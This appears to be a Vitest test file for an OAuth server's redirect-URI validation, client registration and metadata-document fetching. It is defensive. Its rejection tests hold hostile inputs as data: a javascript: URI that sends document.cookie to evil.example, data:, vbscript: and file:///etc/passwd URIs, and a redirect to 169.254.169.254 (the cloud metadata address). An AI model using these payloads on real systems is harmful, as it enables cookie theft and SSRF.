/**
 * Client identity: redirect-URI rules, dynamic registration, and Client ID
 * Metadata Documents.
 *
 * The redirect-URI cases are the ones that decide whether a real client can
 * connect at all — most notably Claude Code, which is an RFC 8252 native client
 * on an ephemeral loopback port.
 */

import { describe, expect, it } from 'vitest';
import {
  isAcceptableRedirectUri,
  isPermittedByOperator,
  looksLikeCimd,
  matchesRedirectUri,
  registerClient,
  resolveCimdClient,
} from '../src/oauth/clients.js';
import { Store } from '../src/store/index.js';
import { MemoryBackend } from '../src/store/memory.js';
import { silentLogger, stubFetch, testConfig } from './helpers.js';

silentLogger();

const newStore = (config = testConfig()) => new Store(new MemoryBackend(0), config);

describe('isAcceptableRedirectUri', () => {
  it.each([
    ['the claude.ai callback', 'https://claude.ai/api/mcp/auth_callback'],
    ['the claude.com callback', 'https://claude.com/api/mcp/auth_callback'],
    ['loopback by name', 'http://localhost/callback'],
    ['loopback by IPv4', 'http://127.0.0.1/callback'],
    ['loopback by IPv6', 'http://[::1]/callback'],
    ['loopback with a port', 'http://127.0.0.1:3118/callback'],
    ['a private-use scheme', 'com.example.app:/oauth'],
    ['an editor scheme', 'vscode://anthropic.claude/authenticate'],
  ])('accepts %s', (_label, uri) => {
    expect(isAcceptableRedirectUri(uri)).toBe(true);
  });

  it.each([
    ['plain http to a public host', 'http://evil.example/callback'],
    ['a fragment', 'https://claude.ai/cb#frag'],
    ['nonsense', 'not a uri'],
    ['an empty string', ''],
  ])('rejects %s', (_label, uri) => {
    expect(isAcceptableRedirectUri(uri)).toBe(false);
  });

  // The private-use branch above accepts any unrecognised scheme, because that
  // is what an RFC 8252 redirect looks like and there is no registry to check
  // one against. These are the schemes that must not ride along on that: they
  // name a capability rather than an application, and a registered one reaches
  // both the consent page's `form-action` and a `Location` header carrying an
  // authorization code.
  it.each([
    ['javascript:', 'javascript:fetch("https://evil.example/"+document.cookie)'],
    ['uppercased javascript:', 'JavaScript:alert(1)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['vbscript:', 'vbscript:msgbox(1)'],
    ['blob:', 'blob:https://evil.example/9b2c'],
    ['file:', 'file:///etc/passwd'],
    ['about:', 'about:blank'],
    ['view-source:', 'view-source:https://evil.example/'],
  ])('rejects the capability scheme %s', (_label, uri) => {
    expect(isAcceptableRedirectUri(uri)).toBe(false);
  });
});

describe('matchesRedirectUri', () => {
  it('matches an https URI exactly', () => {
    const registered = ['https://claude.ai/api/mcp/auth_callback'];
    expect(matchesRedirectUri(registered, 'https://claude.ai/api/mcp/auth_callback')).toBe(true);
    expect(matchesRedirectUri(registered, 'https://claude.ai/api/mcp/auth_callback/')).toBe(false);
    expect(matchesRedirectUri(registered, 'https://evil.example/api/mcp/auth_callback')).toBe(
      false,
    );
  });

  it('ignores the port for a loopback redirect (RFC 8252 §7.3)', () => {
    // Claude Code registers a portless loopback URI and then binds an
    // ephemeral port. Strict string matching rejects it and the connector
    // simply never works — while claude.ai, on a fixed https callback, is fine,
    // which makes it look like a Claude Code bug.
    const registered = ['http://localhost/callback', 'http://127.0.0.1/callback'];
    expect(matchesRedirectUri(registered, 'http://127.0.0.1:3118/callback')).toBe(true);
    expect(matchesRedirectUri(registered, 'http://localhost:54321/callback')).toBe(true);
  });

  it('treats localhost and 127.0.0.1 as interchangeable', () => {
    expect(matchesRedirectUri(['http://localhost/callback'], 'http://127.0.0.1:9/callback')).toBe(
      true,
    );
  });

  it('still requires the path to match on a loopback URI', () => {
    expect(matchesRedirectUri(['http://127.0.0.1/callback'], 'http://127.0.0.1:3118/evil')).toBe(
      false,
    );
  });

  it('does not extend port-agnostic matching to non-loopback hosts', () => {
    expect(matchesRedirectUri(['http://evil.example/cb'], 'http://evil.example:8080/cb')).toBe(
      false,
    );
  });
});

describe('isPermittedByOperator', () => {
  it('permits anything when the allowlist is empty', () => {
    expect(isPermittedByOperator(testConfig(), ['https://anything.example/cb'])).toBe(true);
  });

  it('enforces a configured prefix allowlist over every URI', () => {
    const config = testConfig({
      MCP_ALLOWED_CLIENT_REDIRECT_URIS: 'https://claude.ai/,https://claude.com/',
    });
    expect(isPermittedByOperator(config, ['https://claude.ai/api/mcp/auth_callback'])).toBe(true);
    // One bad URI in the set is enough to reject the registration.
    expect(
      isPermittedByOperator(config, [
        'https://claude.ai/api/mcp/auth_callback',
        'https://evil.example/cb',
      ]),
    ).toBe(false);
  });
});

describe('registerClient', () => {
  it('registers a public web client with the Claude shape', async () => {
    const config = testConfig();
    const result = await registerClient(config, newStore(config), {
      client_name: 'Claude',
      redirect_uris: ['https://claude.ai/api/mcp/auth_callback'],
      token_endpoint_auth_method: 'none',
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.client.applicationType).toBe('web');
    expect(result.client.source).toBe('dcr');
  });

  it('infers application_type=native from a loopback redirect', async () => {
    // The field became required only in MCP 2026-07-28; older clients omit it,
    // and rejecting them would be inventing a requirement they predate.
    const config = testConfig();
    const result = await registerClient(config, newStore(config), {
      redirect_uris: ['http://127.0.0.1/callback'],
    });
    expect(result.ok && result.client.applicationType).toBe('native');
  });

  it('honours an explicit application_type', async () => {
    const config = testConfig();
    const result = await registerClient(config, newStore(config), {
      redirect_uris: ['https://claude.ai/cb'],
      application_type: 'native',
    });
    expect(result.ok && result.client.applicationType).toBe('native');
  });

  it.each([
    ['no redirect_uris', {}],
    ['an empty array', { redirect_uris: [] }],
    ['a non-array', { redirect_uris: 'https://claude.ai/cb' }],
    ['an unacceptable URI', { redirect_uris: ['http://evil.example/cb'] }],
    ['too many URIs', { redirect_uris: Array.from({ length: 11 }, (_, i) => `https://a/${i}`) }],
  ])('rejects %s', async (_label, body) => {
    const config = testConfig();
    const result = await registerClient(config, newStore(config), body);
    expect(result.ok).toBe(false);
  });

  it('stores the client so it can be found again', async () => {
    const config = testConfig();
    const store = newStore(config);
    const result = await registerClient(config, store, {
      redirect_uris: ['https://claude.ai/cb'],
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(await store.getClient(result.client.clientId)).toMatchObject({
      clientId: result.client.clientId,
    });
  });

  it('truncates an over-long client_name rather than storing it whole', async () => {
    const config = testConfig();
    const result = await registerClient(config, newStore(config), {
      redirect_uris: ['https://claude.ai/cb'],
      client_name: 'x'.repeat(5000),
    });
    expect(result.ok && result.client.clientName).toHaveLength(200);
  });
});

describe('registration rejects capability schemes end to end', () => {
  it('refuses a javascript: redirect URI at /register', async () => {
    const config = testConfig();
    const result = await registerClient(config, newStore(config), {
      redirect_uris: ['javascript:alert(1)'],
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toBe('invalid_redirect_uri');
  });

  it('refuses a document whose only redirect URI is a capability scheme', async () => {
    const clientId = 'https://evil.example/meta.json';
    const config = testConfig();
    const stub = stubFetch(
      async () =>
        new Response(JSON.stringify({ client_id: clientId, redirect_uris: ['data:text/html,x'] }), {
          status: 200,
        }),
    );
    try {
      // Filtered down to nothing, which is `no_usable_redirect_uris` — a CIMD
      // document cannot smuggle in what registration refuses.
      expect(await resolveCimdClient(config, newStore(config), clientId)).toBeNull();
    } finally {
      stub.restore();
    }
  });
});

describe('looksLikeCimd', () => {
  it('requires https and a path component', () => {
    // Without the path requirement any origin could claim an identity.
    expect(looksLikeCimd('https://claude.ai/oauth/claude-code-client-metadata')).toBe(true);
    expect(looksLikeCimd('https://claude.ai')).toBe(false);
    expect(looksLikeCimd('https://claude.ai/')).toBe(false);
    expect(looksLikeCimd('http://claude.ai/meta')).toBe(false);
    expect(looksLikeCimd('c_abc123')).toBe(false);
  });
});

describe('resolveCimdClient', () => {
  const clientId = 'https://claude.ai/oauth/claude-code-client-metadata';
  const document = {
    client_id: clientId,
    client_name: 'Claude Code',
    redirect_uris: ['http://localhost/callback', 'http://127.0.0.1/callback'],
    token_endpoint_auth_method: 'none',
    grant_types: ['authorization_code', 'refresh_token'],
  };

  it('fetches, validates and caches a document', async () => {
    const config = testConfig();
    const store = newStore(config);
    const stub = stubFetch(async () => new Response(JSON.stringify(document), { status: 200 }));
    try {
      const client = await resolveCimdClient(config, store, clientId);
      expect(client).toMatchObject({ clientId, clientName: 'Claude Code', source: 'cimd' });
      expect(client?.applicationType).toBe('native');
      // Cached, so the next authorize does not refetch.
      expect(await store.getClient(clientId)).not.toBeNull();
    } finally {
      stub.restore();
    }
  });

  it('rejects a document whose client_id does not match the URL it came from', async () => {
    // Otherwise any https host could publish a document claiming someone
    // else's identity and inherit their registration.
    const config = testConfig();
    const stub = stubFetch(
      async () =>
        new Response(JSON.stringify({ ...document, client_id: 'https://evil.example/meta' }), {
          status: 200,
        }),
    );
    try {
      expect(await resolveCimdClient(config, newStore(config), clientId)).toBeNull();
    } finally {
      stub.restore();
    }
  });

  it('does not follow redirects', async () => {
    // A 302 to 169.254.169.254 would undo the address check entirely.
    const config = testConfig();
    let seen: Request | undefined;
    const stub = stubFetch(async (request) => {
      seen = request;
      return new Response(JSON.stringify(document), { status: 200 });
    });
    try {
      await resolveCimdClient(config, newStore(config), clientId);
      expect(seen?.redirect).toBe('error');
    } finally {
      stub.restore();
    }
  });

  it.each([
    ['a non-200', async () => new Response('', { status: 404 })],
    ['non-JSON', async () => new Response('<html>', { status: 200 })],
    [
      'no usable redirect URIs',
      async () =>
        new Response(JSON.stringify({ ...document, redirect_uris: ['http://evil.example/cb'] }), {
          status: 200,
        }),
    ],
    [
      'a transport failure',
      async () => {
        throw new Error('boom');
      },
    ],
  ])('returns null for %s', async (_label, handler) => {
    const config = testConfig();
    const stub = stubFetch(handler as never);
    try {
      expect(await resolveCimdClient(config, newStore(config), clientId)).toBeNull();
    } finally {
      stub.restore();
    }
  });

  it('ignores a client id that is not a CIMD URL', async () => {
    const config = testConfig();
    expect(await resolveCimdClient(config, newStore(config), 'c_local')).toBeNull();
  });
});
